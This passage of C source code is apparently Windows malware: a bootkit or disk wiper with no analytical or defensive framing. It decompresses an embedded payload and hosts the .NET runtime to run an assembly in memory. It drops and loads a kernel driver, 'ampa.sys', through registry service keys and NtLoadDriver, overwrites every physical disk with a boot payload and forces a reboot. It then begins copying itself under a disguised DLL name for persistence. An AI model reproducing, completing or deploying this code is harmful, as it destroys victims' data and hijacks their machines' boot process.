                while (BitCount < DEFLATE_BLOCK_TYPE_BITS) {
                    if (InputPtr >= InputEnd) {
                        Result = (Flags & 2) ? 1 : -4;
                        Context->State = DEFLATE_STATE_BLOCK_HEADER;
                        goto cleanup;
                    }
                    BitBuffer |= (uint64_t)*InputPtr++ << BitCount;
                    BitCount += 8;
                }

                Context->IsFinalBlock = (uint32_t)BitBuffer & 1;
                BitBuffer >>= 1;
                BitCount--;
                Context->BlockType = (uint32_t)BitBuffer & 3;
                BitBuffer >>= 2;
                BitCount -= 2;

                if (Context->BlockType == 0) {
                    BitBuffer >>= BitCount & 7;
                    BitCount &= ~7;
                    State = DEFLATE_STATE_UNCOMPRESSED_LEN;
                }
                else if (Context->BlockType == 1) {
                    Context->LiteralLengthCodes = 0x120;
                    Context->DistanceCodes = 0x20;

                    memset(Context->CodeLengths + 0x48, 5, 0x20);
                    memset(Context->CodeLengths, 8, 0x90);
                    memset(Context->CodeLengths + 0x90, 9, 0x70);
                    memset(Context->CodeLengths + 0x100, 7, 0x18);
                    memset(Context->CodeLengths + 0x118, 8, 0x8);

                    State = DEFLATE_STATE_DECODE_LITERAL;
                }
                else if (Context->BlockType == 2) {
                    for (uint32_t i = 0; i < 3; i++) {
                        while (BitCount < g_LengthExtraBits[i]) {
                            if (InputPtr >= InputEnd) {
                                Result = (Flags & 2) ? 1 : -4;
                                Context->State = DEFLATE_STATE_DYNAMIC_HUFFMAN;
                                goto cleanup;
                            }
                            BitBuffer |= (uint64_t)*InputPtr++ << BitCount;
                            BitCount += 8;
                        }

                        uint32_t Bits = g_LengthExtraBits[i];
                        (&Context->LiteralLengthCodes)[i] = ((1 << Bits) - 1) & (uint32_t)BitBuffer;
                        BitBuffer >>= Bits;
                        BitCount -= Bits;
                        (&Context->LiteralLengthCodes)[i] += g_LengthBase[i];
                    }

                    memset(Context->CodeLengths + 0x7B5 - 0x765, 0, 0x13);

                    for (uint32_t i = 0; i < Context->CodeLengthCodes; i++) {
                        while (BitCount < 3) {
                            if (InputPtr >= InputEnd) {
                                Result = (Flags & 2) ? 1 : -4;
                                Context->State = DEFLATE_STATE_DYNAMIC_HUFFMAN;
                                goto cleanup;
                            }
                            BitBuffer |= (uint64_t)*InputPtr++ << BitCount;
                            BitCount += 8;
                        }

                        uint32_t Len = (uint32_t)BitBuffer & 7;
                        BitBuffer >>= 3;
                        BitCount -= 3;
                        Context->CodeLengths[g_CodeLengthOrder[i]] = (uint8_t)Len;
                    }

                    Context->CodeLengthCodes = 0x13;
                    State = DEFLATE_STATE_DECODE_LITERAL;
                }
                else {
                    Result = -1;
                    Context->State = DEFLATE_STATE_ERROR;
                    goto cleanup;
                }
                continue;

            case DEFLATE_STATE_UNCOMPRESSED_LEN:
                for (uint32_t i = 0; i < 4; i++) {
                    if (BitCount == 0) {
                        if (InputPtr >= InputEnd) {
                            Result = (Flags & 2) ? 1 : -4;
                            Context->State = DEFLATE_STATE_UNCOMPRESSED_LEN;
                            goto cleanup;
                        }
                        ((uint8_t*)&Context->UncompressedLength)[i] = *InputPtr++;
                    } else {
                        while (BitCount < 8) {
                            if (InputPtr >= InputEnd) {
                                Result = (Flags & 2) ? 1 : -4;
                                Context->State = DEFLATE_STATE_UNCOMPRESSED_LEN;
                                goto cleanup;
                            }
                            BitBuffer |= (uint64_t)*InputPtr++ << BitCount;
                            BitCount += 8;
                        }
                        ((uint8_t*)&Context->UncompressedLength)[i] = (uint8_t)BitBuffer;
                        BitBuffer >>= 8;
                        BitCount -= 8;
                    }
                }

                uint16_t Len = *(uint16_t*)&Context->UncompressedLength;
                uint16_t NLen = *(uint16_t*)((uint8_t*)&Context->UncompressedLength + 2);

                if (Len != (uint16_t)~NLen) {
                    Result = -1;
                    Context->State = DEFLATE_STATE_ERROR;
                    goto cleanup;
                }

                Context->UncompressedLength = Len;
                State = DEFLATE_STATE_UNCOMPRESSED_DATA;

            case DEFLATE_STATE_UNCOMPRESSED_DATA:
                while (Context->UncompressedLength > 0 && InputPtr < InputEnd && OutputPtr < OutputEnd) {
                    *OutputPtr++ = *InputPtr++;
                    Context->UncompressedLength--;
                }

                if (Context->UncompressedLength > 0) {
                    if (InputPtr >= InputEnd) {
                        Result = (Flags & 2) ? 1 : -4;
                        Context->State = DEFLATE_STATE_UNCOMPRESSED_DATA;
                        goto cleanup;
                    }
                    if (OutputPtr >= OutputEnd) {
                        Result = 2;
                        Context->State = DEFLATE_STATE_UNCOMPRESSED_DATA;
                        goto cleanup;
                    }
                }

                if (!Context->IsFinalBlock) {
                    State = DEFLATE_STATE_BLOCK_HEADER;
                    continue;
                }
                State = DEFLATE_STATE_CHECKSUM;
                continue;

            case DEFLATE_STATE_DECODE_LITERAL:
                while (1) {
                    if (BitCount < 15) {
                        if (InputEnd - InputPtr < 2) {
                            if (InputPtr >= InputEnd) {
                                Result = (Flags & 2) ? 1 : -4;
                                Context->State = DEFLATE_STATE_DECODE_LITERAL;
                                goto cleanup;
                            }
                        } else {
                            BitBuffer |= (uint64_t)*(uint16_t*)InputPtr << BitCount;
                            BitCount += 16;
                            InputPtr += 2;
                        }
                    }

                    uint32_t Symbol = Context->LiteralTree[BitBuffer & 0x3FF];
                    int32_t Bits;

                    if ((int16_t)Symbol < 0) {
                        Bits = 10;
                        do {
                            Symbol = Context->CodeLengthTree[~Symbol + ((BitBuffer >> Bits) & 1)];
                            Bits++;
                        } while ((int16_t)Symbol < 0);
                    } else {
                        Bits = Symbol >> 9;
                        Symbol &= 0x1FF;
                    }

                    LastSymbol = Symbol;
                    BitBuffer >>= Bits;
                    BitCount -= Bits;

                    if (Symbol < 0x100) {
                        if (OutputPtr >= OutputEnd) {
                            Result = 2;
                            Context->State = DEFLATE_STATE_DECODE_LITERAL;
                            goto cleanup;
                        }
                        *OutputPtr++ = (uint8_t)Symbol;
                        continue;
                    }

                    if (Symbol == 0x100) {
                        if (!Context->IsFinalBlock) {
                            State = DEFLATE_STATE_BLOCK_HEADER;
                            break;
                        }
                        State = DEFLATE_STATE_CHECKSUM;
                        break;
                    }

                    uint32_t LengthCode = Symbol - 0x101;
                    uint32_t ExtraBits = g_LengthExtraBits[LengthCode];
                    uint32_t Length = g_LengthBase[LengthCode];

                    if (ExtraBits > 0) {
                        while (BitCount < ExtraBits) {
                            if (InputPtr >= InputEnd) {
                                Result = (Flags & 2) ? 1 : -4;
                                Context->State = DEFLATE_STATE_DECODE_LENGTH;
                                goto cleanup;
                            }
                            BitBuffer |= (uint64_t)*InputPtr++ << BitCount;
                            BitCount += 8;
                        }
                        Length += ((uint32_t)BitBuffer & ((1 << ExtraBits) - 1));
                        BitBuffer >>= ExtraBits;
                        BitCount -= ExtraBits;
                    }

                    LastLength = Length;

                    if (BitCount < 15) {
                        if (InputEnd - InputPtr < 2) {
                            if (InputPtr >= InputEnd) {
                                Result = (Flags & 2) ? 1 : -4;
                                Context->State = DEFLATE_STATE_DECODE_DISTANCE;
                                goto cleanup;
                            }
                        } else {
                            BitBuffer |= (uint64_t)*(uint16_t*)InputPtr << BitCount;
                            BitCount += 16;
                            InputPtr += 2;
                        }
                    }

                    uint32_t DistSymbol = Context->DistanceTree[BitBuffer & 0x3FF];
                    if ((int16_t)DistSymbol < 0) {
                        Bits = 10;
                        do {
                            DistSymbol = Context->DistanceTree[0x420 + ~DistSymbol + ((BitBuffer >> Bits) & 1)];
                            Bits++;
                        } while ((int16_t)DistSymbol < 0);
                    } else {
                        Bits = DistSymbol >> 9;
                        DistSymbol &= 0x1FF;
                    }

                    BitBuffer >>= Bits;
                    BitCount -= Bits;

                    uint32_t DistExtraBits = g_DistanceExtraBits[DistSymbol];
                    uint32_t Distance = g_DistanceBase[DistSymbol];

                    if (DistExtraBits > 0) {
                        while (BitCount < DistExtraBits) {
                            if (InputPtr >= InputEnd) {
                                Result = (Flags & 2) ? 1 : -4;
                                Context->State = DEFLATE_STATE_DECODE_DISTANCE;
                                goto cleanup;
                            }
                            BitBuffer |= (uint64_t)*InputPtr++ << BitCount;
                            BitCount += 8;
                        }
                        Distance += ((uint32_t)BitBuffer & ((1 << DistExtraBits) - 1));
                        BitBuffer >>= DistExtraBits;
                        BitCount -= DistExtraBits;
                    }

                    OutputPosition = (uint64_t)(OutputPtr - WindowStart);

                    if ((Distance == 0 || OutputPosition < Distance || OutputPosition == 0) && !(Flags & 4)) {
                        Result = -1;
                        Context->State = DEFLATE_STATE_ERROR;
                        goto cleanup;
                    }

                    uint8_t* CopySource = WindowStart + ((OutputPosition - Distance) & WindowMask);

                    while (Length > 0) {
                        if (OutputPtr >= OutputEnd) {
                            Result = 2;
                            Context->State = DEFLATE_STATE_COPY_DATA;
                            goto cleanup;
                        }
                        *OutputPtr++ = *CopySource++;
                        OutputPosition++;
                        Length--;
                    }
                }
                continue;

            case DEFLATE_STATE_CHECKSUM:
                if (Flags & 1) {
                    for (uint32_t i = 0; i < 4; i++) {
                        if (BitCount == 0) {
                            if (InputPtr >= InputEnd) {
                                Result = (Flags & 2) ? 1 : -4;
                                Context->State = DEFLATE_STATE_CHECKSUM;
                                goto cleanup;
                            }
                            Context->ExpectedAdler32 = (Context->ExpectedAdler32 << 8) | *InputPtr++;
                        } else {
                            while (BitCount < 8) {
                                if (InputPtr >= InputEnd) {
                                    Result = (Flags & 2) ? 1 : -4;
                                    Context->State = DEFLATE_STATE_CHECKSUM;
                                    goto cleanup;
                                }
                                BitBuffer |= (uint64_t)*InputPtr++ << BitCount;
                                BitCount += 8;
                            }
                            Context->ExpectedAdler32 = (Context->ExpectedAdler32 << 8) | ((uint32_t)BitBuffer & 0xFF);
                            BitBuffer >>= 8;
                            BitCount -= 8;
                        }
                    }
                }

                Result = 0;
                Context->State = DEFLATE_STATE_DONE;
                goto cleanup;

            default:
                Result = -1;
                Context->State = State;
                goto cleanup;
        }
    }

cleanup:
    Context->BitBuffer = BitBuffer & ~(-1LL << (BitCount & 0x3F));
    Context->BitCount = BitCount;
    Context->OutputPosition = OutputPosition;

    *InputSize = InputPtr - Input;
    *OutputSize = OutputPtr - Output;

    if ((Flags & 9) && Result >= 0) {
        uint32_t Adler = CalculateAdler32(1, Output, *OutputSize);
        Context->Adler32Low = Adler & 0xFFFF;
        Context->Adler32High = (Adler >> 16) & 0xFFFF;

        if (Result == 0 && (Flags & 1) && Adler != Context->ExpectedAdler32) {
            Result = -2;
        }
    }

    return Result;
}

static PVOID DecompressData(const uint8_t* CompressedData, size_t CompressedSize, size_t* DecompressedSize)
{
    PDEFLATE_CONTEXT Context = (PDEFLATE_CONTEXT)calloc(1, sizeof(DEFLATE_CONTEXT));
    if (!Context) {
        return NULL;
    }

    size_t OutputCapacity = CompressedSize * 4;
    PVOID OutputBuffer = malloc(OutputCapacity);
    if (!OutputBuffer) {
        free(Context);
        return NULL;
    }

    size_t InputRemaining = CompressedSize;
    size_t OutputRemaining = OutputCapacity;
    size_t OutputProduced = 0;

    int Result = DecompressInflate(Context, CompressedData, &InputRemaining,
                                    (uint8_t*)OutputBuffer, (uint8_t*)OutputBuffer + OutputCapacity,
                                    &OutputRemaining, 1);

    if (Result != 0 && Result != 1) {
        free(OutputBuffer);
        free(Context);
        return NULL;
    }

    *DecompressedSize = OutputRemaining;
    free(Context);

    return OutputBuffer;
}

static HRESULT InitializeClrRuntime(PCLR_INTERFACES ClrContext)
{
    PFN_CLRCreateInstance pCLRCreateInstance = NULL;
    HMODULE hMscoree = LoadLibraryA("mscoree.dll");

    if (!hMscoree) {
        return E_FAIL;
    }

    pCLRCreateInstance = (PFN_CLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");

    if (!pCLRCreateInstance) {
        return E_FAIL;
    }

    HRESULT hr = pCLRCreateInstance(
        (REFCLSID)&CLSID_CLRMetaHost_Value,
        (REFIID)&IID_ICLRMetaHost_Value,
        &ClrContext->MetaHost
    );

    if (FAILED(hr)) {
        return hr;
    }

    typedef HRESULT (WINAPI *PFN_GetRuntime)(PVOID This, LPCWSTR pwzVersion, REFIID riid, PVOID *ppRuntime);
    PFN_GetRuntime pGetRuntime = *(PFN_GetRuntime*)(*(ULONG_PTR*)ClrContext->MetaHost + 0x18);

    hr = pGetRuntime(
        ClrContext->MetaHost,
        L"v4.0.30319",
        (REFIID)&IID_ICLRRuntimeInfo_Value,
        &ClrContext->RuntimeInfo
    );

    if (FAILED(hr)) {
        return hr;
    }

    typedef HRESULT (WINAPI *PFN_GetInterface)(PVOID This, REFCLSID rclsid, REFIID riid, LPVOID *ppUnk);
    PFN_GetInterface pGetInterface = *(PFN_GetInterface*)(*(ULONG_PTR*)ClrContext->RuntimeInfo + 0x48);

    hr = pGetInterface(
        ClrContext->RuntimeInfo,
        (REFCLSID)&IID_ICorrRuntimeHost_Value,
        (REFIID)&IID_ICorrRuntimeHost_Value,
        &ClrContext->CorRuntimeHost
    );

    if (FAILED(hr)) {
        return hr;
    }

    typedef HRESULT (WINAPI *PFN_Start)(PVOID This);
    PFN_Start pStart = *(PFN_Start*)(*(ULONG_PTR*)ClrContext->CorRuntimeHost + 0x50);

    hr = pStart(ClrContext->CorRuntimeHost);

    if (FAILED(hr)) {
        return hr;
    }

    typedef HRESULT (WINAPI *PFN_GetDefaultDomain)(PVOID This, PVOID *ppAppDomain);
    PFN_GetDefaultDomain pGetDefaultDomain = *(PFN_GetDefaultDomain*)(*(ULONG_PTR*)ClrContext->CorRuntimeHost + 0x68);

    hr = pGetDefaultDomain(ClrContext->CorRuntimeHost, &ClrContext->AppDomain);

    return hr;
}

static HRESULT ExecuteManagedAssembly(PCLR_INTERFACES ClrContext, PVOID AssemblyData, ULONG AssemblySize)
{
    typedef HRESULT (WINAPI *PFN_Load_3)(PVOID This, PVOID rawData, PVOID* ppAssembly);
    PFN_Load_3 pLoad_3 = *(PFN_Load_3*)(*(ULONG_PTR*)ClrContext->AppDomain + 0x168);

    PVOID Assembly = NULL;

    HMODULE hOleaut32 = LoadLibraryA("oleaut32.dll");
    typedef SAFEARRAY* (WINAPI *PFN_SafeArrayCreateVector)(VARTYPE vt, LONG lLbound, ULONG cElements);
    typedef HRESULT (WINAPI *PFN_SafeArrayAccessData)(SAFEARRAY* psa, void** ppvData);
    typedef HRESULT (WINAPI *PFN_SafeArrayUnaccessData)(SAFEARRAY* psa);

    PFN_SafeArrayCreateVector pSafeArrayCreateVector = (PFN_SafeArrayCreateVector)GetProcAddress(hOleaut32, "SafeArrayCreateVector");
    PFN_SafeArrayAccessData pSafeArrayAccessData = (PFN_SafeArrayAccessData)GetProcAddress(hOleaut32, "SafeArrayAccessData");

    SAFEARRAY* Sa = pSafeArrayCreateVector(VT_UI1, 0, AssemblySize);
    PVOID SaData = NULL;
    pSafeArrayAccessData(Sa, &SaData);
    RtlCopyMemory(SaData, AssemblyData, AssemblySize);

    HRESULT hr = pLoad_3(ClrContext->AppDomain, Sa, &Assembly);

    if (FAILED(hr) || !Assembly) {
        return E_POINTER;
    }

    typedef HRESULT (WINAPI *PFN_InvokeMember_3)(PVOID This, BSTR bstrName, LONG lFlags, PVOID Binder, PVOID Target, SAFEARRAY* args, PVOID* pRetVal);
    PFN_InvokeMember_3 pInvokeMember_3 = *(PFN_InvokeMember_3*)(*(ULONG_PTR*)Assembly + 0x128);

    VARIANT RetVal;
    RetVal.vt = VT_EMPTY;

    hr = pInvokeMember_3(Assembly, NULL, 0x100 | 0x200 | 0x8, NULL, NULL, NULL, &RetVal);

    return hr;
}

static VOID ReleaseComInterface(PVOID Interface)
{
    if (Interface) {
        typedef ULONG (WINAPI *PFN_Release)(PVOID This);
        PFN_Release pRelease = *(PFN_Release*)(*(ULONG_PTR*)Interface + 0x10);
        pRelease(Interface);
    }
}

static VOID ReleaseClrContext(PCLR_INTERFACES ClrContext)
{
    if (ClrContext->Assembly) ReleaseComInterface(ClrContext->Assembly);
    if (ClrContext->AppDomain) ReleaseComInterface(ClrContext->AppDomain);

    if (ClrContext->CorRuntimeHost) {
        typedef HRESULT (WINAPI *PFN_Stop)(PVOID This);
        PFN_Stop pStop = *(PFN_Stop*)(*(ULONG_PTR*)ClrContext->CorRuntimeHost + 0x58);
        pStop(ClrContext->CorRuntimeHost);
        ReleaseComInterface(ClrContext->CorRuntimeHost);
    }

    if (ClrContext->RuntimeInfo) ReleaseComInterface(ClrContext->RuntimeInfo);
    if (ClrContext->MetaHost) ReleaseComInterface(ClrContext->MetaHost);
}

static BOOL FileExists(LPCSTR FilePath)
{
    if (!FilePath) return FALSE;
    return GetFileAttributesA(FilePath) != INVALID_FILE_ATTRIBUTES;
}

static BOOL FileOpen(PFILE_HANDLE FileHandle, LPCSTR FilePath, uint32_t AccessMode, DWORD ShareMode, DWORD CreationDisposition)
{
    if (!FileHandle || !FilePath) return FALSE;

    memset(FileHandle, 0, sizeof(FILE_HANDLE));

    DWORD DesiredAccess = 0;
    DWORD FlagsAndAttributes = FILE_ATTRIBUTE_NORMAL;

    if (AccessMode & 1) {
        DesiredAccess |= GENERIC_READ;
        FlagsAndAttributes = FILE_FLAG_SEQUENTIAL_SCAN;
    }
    if (AccessMode & 2) {
        DesiredAccess |= GENERIC_WRITE;
    }
    if (AccessMode & 0x20) {
        FlagsAndAttributes |= FILE_ATTRIBUTE_HIDDEN;
    }
    if (AccessMode & 0x40) {
        FlagsAndAttributes |= FILE_ATTRIBUTE_SYSTEM;
    }

    HANDLE hFile = CreateFileA(FilePath, DesiredAccess, ShareMode, NULL, CreationDisposition, FlagsAndAttributes, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    FileHandle->Handle = hFile;
    FileHandle->AccessFlags = AccessMode;
    return TRUE;
}

static BOOL FileIsOpen(PFILE_HANDLE FileHandle)
{
    return FileHandle && FileHandle->Handle != NULL && FileHandle->Handle != INVALID_HANDLE_VALUE;
}

static BOOL FileGetSize(PFILE_HANDLE FileHandle, uint64_t* FileSize)
{
    if (!FileIsOpen(FileHandle) || !FileSize) return FALSE;

    DWORD HighSize = 0;
    DWORD LowSize = GetFileSize(FileHandle->Handle, &HighSize);

    if (LowSize == INVALID_FILE_SIZE && GetLastError() != NO_ERROR) {
        return FALSE;
    }

    *FileSize = ((uint64_t)HighSize << 32) | LowSize;
    return TRUE;
}

static uint64_t FileWrite(PFILE_HANDLE FileHandle, const void* Data, uint64_t Size)
{
    if (!Data || !FileIsOpen(FileHandle) || Size == 0 || !(FileHandle->AccessFlags & 2)) {
        return 0;
    }

    if (Size > 0xFFFFFFFF) Size = 0xFFFFFFFF;

    DWORD BytesWritten = 0;
    if (!WriteFile(FileHandle->Handle, Data, (DWORD)Size, &BytesWritten, NULL)) {
        return 0;
    }

    FileHandle->Position += BytesWritten;
    return BytesWritten;
}

static BOOL FileClose(PFILE_HANDLE FileHandle)
{
    if (!FileIsOpen(FileHandle)) return FALSE;

    if (!CloseHandle(FileHandle->Handle)) return FALSE;

    memset(FileHandle, 0, sizeof(FILE_HANDLE));
    return TRUE;
}

static BOOL FileDelete(LPCSTR FilePath)
{
    if (!FilePath) return FALSE;
    return DeleteFileA(FilePath);
}

static BOOL FileSecureDelete(LPCSTR FilePath)
{
    if (!FilePath) return FALSE;

    FILE_HANDLE FileHandle;
    if (!FileOpen(&FileHandle, FilePath, 2, 0, OPEN_EXISTING)) {
        return FALSE;
    }

    uint64_t FileSize;
    if (!FileGetSize(&FileHandle, &FileSize)) {
        FileClose(&FileHandle);
        return FALSE;
    }

    uint8_t* Buffer = (uint8_t*)calloc(1, 0x1000);
    if (!Buffer) {
        FileClose(&FileHandle);
        return FALSE;
    }

    uint64_t TotalWritten = 0;
    BOOL Success = TRUE;

    while (TotalWritten < FileSize) {
        uint64_t ToWrite = 0x1000;
        if (FileSize - TotalWritten < ToWrite) {
            ToWrite = FileSize - TotalWritten;
        }

        uint64_t Written = FileWrite(&FileHandle, Buffer, ToWrite);
        if (Written != ToWrite) {
            Success = FALSE;
            break;
        }
        TotalWritten += Written;
    }

    free(Buffer);
    FileClose(&FileHandle);

    if (!Success) return FALSE;
    return FileDelete(FilePath);
}

static PVOID AllocateZeroedMemory(size_t Size)
{
    PVOID Memory = malloc(Size);
    if (Memory) {
        memset(Memory, 0, Size);
    }
    return Memory;
}

static BOOL EnablePrivilege(LPCSTR PrivilegeName)
{
    LUID Luid;
    if (!g_NativeApis.LookupPrivilegeValueA(NULL, PrivilegeName, &Luid)) {
        return FALSE;
    }

    HANDLE Token;
    if (!g_NativeApis.OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &Token)) {
        return FALSE;
    }

    TOKEN_PRIVILEGES TP;
    TP.PrivilegeCount = 1;
    TP.Privileges[0].Luid = Luid;
    TP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL Result = g_NativeApis.AdjustTokenPrivileges(Token, FALSE, &TP, sizeof(TP), NULL, NULL);
    CloseHandle(Token);

    return Result;
}

static BOOL IsWindowsVistaOrLater(VOID)
{
    OSVERSIONINFOEXW Osvi;
    ZeroMemory(&Osvi, sizeof(Osvi));
    Osvi.dwOSVersionInfoSize = sizeof(Osvi);
    Osvi.dwMajorVersion = 6;

    DWORDLONG ConditionMask = 0;
    ConditionMask = VerSetConditionMask(ConditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL);
    ConditionMask = VerSetConditionMask(ConditionMask, VER_MINORVERSION, VER_GREATER_EQUAL);
    ConditionMask = VerSetConditionMask(ConditionMask, VER_SERVICEPACKMAJOR, VER_GREATER_EQUAL);

    return VerifyVersionInfoW(&Osvi, VER_MAJORVERSION | VER_MINORVERSION | VER_SERVICEPACKMAJOR, ConditionMask);
}

static BOOL ExtractResourceToFile(PVOID* Data, uint64_t* Size)
{
    HRSRC Resource = FindResourceA(g_CurrentModule, MAKEINTRESOURCEA(0x65), MAKEINTRESOURCEA(0xA));
    if (!Resource) return FALSE;

    HGLOBAL Loaded = LoadResource(g_CurrentModule, Resource);
    if (!Loaded) return FALSE;

    PVOID ResourceData = LockResource(Loaded);
    if (!ResourceData) return FALSE;

    DWORD ResourceSize = SizeofResource(g_CurrentModule, Resource);
    if (ResourceSize == 0) return FALSE;

    *Data = ResourceData;
    *Size = ResourceSize;
    return TRUE;
}

static BOOL DeployDriverToDisk(LPCSTR DriverPath)
{
    if (FileExists(DriverPath)) return TRUE;

    PVOID DriverData;
    uint64_t DriverSize;
    if (!ExtractResourceToFile(&DriverData, &DriverSize)) return FALSE;

    FILE_HANDLE FileHandle;
    if (!FileOpen(&FileHandle, DriverPath, 3, 0, CREATE_ALWAYS)) return FALSE;

    uint64_t Written = FileWrite(&FileHandle, DriverData, DriverSize);
    FileClose(&FileHandle);

    return Written == DriverSize;
}

static BOOL CleanupDriverRegistry(VOID)
{
    LONG Result = g_NativeApis.RegDeleteKeyA(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Services\\ampa");
    return (Result == ERROR_SUCCESS) || (Result == ERROR_FILE_NOT_FOUND);
}

static BOOL CreateDriverService(VOID)
{
    HKEY Key;
    LONG Result = g_NativeApis.RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "System\\CurrentControlSet\\Services\\ampa", 0, NULL, 0,
        KEY_WRITE, NULL, &Key, NULL);

    if (Result != ERROR_SUCCESS) return FALSE;

    DWORD StartType = 3;
    DWORD ErrorControl = 1;
    DWORD Type = 1;
    CHAR ImagePath[] = "System32\\ampa.sys";

    BOOL Success = TRUE;
    if (g_NativeApis.RegSetValueExA(Key, "ImagePath", 0, REG_EXPAND_SZ, (BYTE*)ImagePath, sizeof(ImagePath)) != ERROR_SUCCESS) Success = FALSE;
    if (g_NativeApis.RegSetValueExA(Key, "Type", 0, REG_DWORD, (BYTE*)&Type, sizeof(Type)) != ERROR_SUCCESS) Success = FALSE;
    if (g_NativeApis.RegSetValueExA(Key, "ErrorControl", 0, REG_DWORD, (BYTE*)&ErrorControl, sizeof(ErrorControl)) != ERROR_SUCCESS) Success = FALSE;
    if (g_NativeApis.RegSetValueExA(Key, "Start", 0, REG_DWORD, (BYTE*)&StartType, sizeof(StartType)) != ERROR_SUCCESS) Success = FALSE;

    g_NativeApis.RegCloseKey(Key);

    if (!Success) {
        CleanupDriverRegistry();
    }

    return Success;
}

static BOOL BuildDriverPath(PSTR Buffer, SIZE_T BufferSize)
{
    UINT Len = GetWindowsDirectoryA(Buffer, (UINT)BufferSize);
    if (Len == 0) return FALSE;

    strcat_s(Buffer, BufferSize, "\\System32\\ampa.sys");
    return TRUE;
}

static BOOL ConvertToUnicodeString(PUNICODE_STRING Unicode, PCSTR Ansi)
{
    ANSI_STRING AnsiString;
    g_NativeApis.RtlInitAnsiString(&AnsiString, Ansi);

    NTSTATUS Status = g_NativeApis.RtlAnsiStringToUnicodeString(Unicode, &AnsiString, TRUE);
    return NT_SUCCESS(Status);
}

static BOOL LoadKernelDriver(VOID)
{
    if (!IsWindowsVistaOrLater()) return TRUE;

    CHAR DriverPath[MAX_PATH];
    if (!BuildDriverPath(DriverPath, sizeof(DriverPath))) return FALSE;

    if (!DeployDriverToDisk(DriverPath)) return FALSE;

    if (!EnablePrivilege("SeLoadDriverPrivilege")) return FALSE;

    if (!CreateDriverService()) return FALSE;

    UNICODE_STRING UnicodePath;
    if (!ConvertToUnicodeString(&UnicodePath, "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\ampa")) {
        return FALSE;
    }

    NTSTATUS Status = g_NativeApis.NtLoadDriver(&UnicodePath);
    g_NativeApis.RtlFreeUnicodeString(&UnicodePath);
    CleanupDriverRegistry();

    return NT_SUCCESS(Status) || (Status == 0xC00000F2);
}

static BOOL UnloadKernelDriver(VOID)
{
    if (!IsWindowsVistaOrLater()) return TRUE;

    if (!CreateDriverService()) return FALSE;

    UNICODE_STRING UnicodePath;
    if (!ConvertToUnicodeString(&UnicodePath, "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\ampa")) {
        return FALSE;
    }

    NTSTATUS Status = g_NativeApis.NtUnloadDriver(&UnicodePath);
    g_NativeApis.RtlFreeUnicodeString(&UnicodePath);
    CleanupDriverRegistry();

    CHAR DriverPath[MAX_PATH];
    if (BuildDriverPath(DriverPath, sizeof(DriverPath))) {
        FileSecureDelete(DriverPath);
    }

    return NT_SUCCESS(Status);
}

static BOOL WriteBootloaderToPhysicalDisk(uint32_t DiskIndex)
{
    LPCSTR DeviceFormat = IsWindowsVistaOrLater() ? "\\\\.\\PhysicalDrive%u" : "\\\\.\\%c:";

    CHAR DevicePath[32];
    sprintf_s(DevicePath, sizeof(DevicePath), DeviceFormat, DiskIndex);

    HANDLE Device = CreateFileA(DevicePath, GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                                 OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);

    if (Device == INVALID_HANDLE_VALUE) return FALSE;

    DWORD BytesWritten = 0;
    BOOL Success = WriteFile(Device, g_PayloadData, (DWORD)g_PayloadSize, &BytesWritten, NULL);

    CloseHandle(Device);

    return Success && (BytesWritten == g_PayloadSize);
}

static uint32_t EnumeratePhysicalDisks(VOID)
{
    HKEY Key;
    LONG Result = g_NativeApis.RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "System\\CurrentControlSet\\Services\\disk\\Enum", 0, KEY_READ, &Key);

    if (Result != ERROR_SUCCESS) return 1;

    DWORD Count = 0;
    DWORD Size = sizeof(Count);
    DWORD Type = REG_DWORD;

    Result = g_NativeApis.RegQueryValueExA(Key, "Count", NULL, &Type, (BYTE*)&Count, &Size);
    g_NativeApis.RegCloseKey(Key);

    return (Result == ERROR_SUCCESS) ? Count : 1;
}

static BOOL ForceSystemReboot(VOID)
{
    if (!EnablePrivilege("SeShutdownPrivilege")) return FALSE;
    return ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER | SHTDN_REASON_FLAG_PLANNED);
}

static VOID ExtractPayloadToMemory(VOID)
{
    PVOID CompressedData;
    uint64_t CompressedSize;

    if (ExtractResourceToFile(&CompressedData, &CompressedSize)) {
        size_t DecompressedSize = 0;
        g_PayloadData = DecompressData((const uint8_t*)CompressedData, CompressedSize, &DecompressedSize);
        g_PayloadSize = DecompressedSize;
    }
}

static VOID ExecuteInfectionChain(VOID)
{
    if (!ResolveNativeApis(&g_NativeApis)) return;

    if (!LoadKernelDriver()) return;

    uint32_t DiskCount = EnumeratePhysicalDisks();
    for (uint32_t i = DiskCount; i > 0; i--) {
        WriteBootloaderToPhysicalDisk(i - 1);
    }

    UnloadKernelDriver();
    ForceSystemReboot();
}

static HRESULT ExecuteClrPayload(PUCHAR PayloadData, ULONG PayloadSize, LPCSTR CommandLine, ULONG CommandLineLength)
{
    CLR_INTERFACES ClrContext = {0};
    HRESULT hr = InitializeClrRuntime(&ClrContext);

    if (FAILED(hr)) {
        return hr;
    }

    hr = ExecuteManagedAssembly(&ClrContext, PayloadData, PayloadSize);

    ReleaseClrContext(&ClrContext);

    return hr;
}

__declspec(dllexport) VOID InstallPersistence(VOID)
{
    HMODULE CurrentModule = NULL;
    BOOL Success = GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                                       GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                                     (LPCSTR)InstallPersistence, &CurrentModule);

    if (!Success) return;

    CHAR CurrentPath[MAX_PATH];
    DWORD PathLen = GetModuleFileNameA(CurrentModule, CurrentPath, sizeof(CurrentPath));
    if (PathLen == 0) return;

    CHAR SystemPath[MAX_PATH];
    GetSystemDirectoryA(SystemPath, sizeof(SystemPath));

    strcat_s(SystemPath, sizeof(SystemPath), "\\w32analytics.dll");

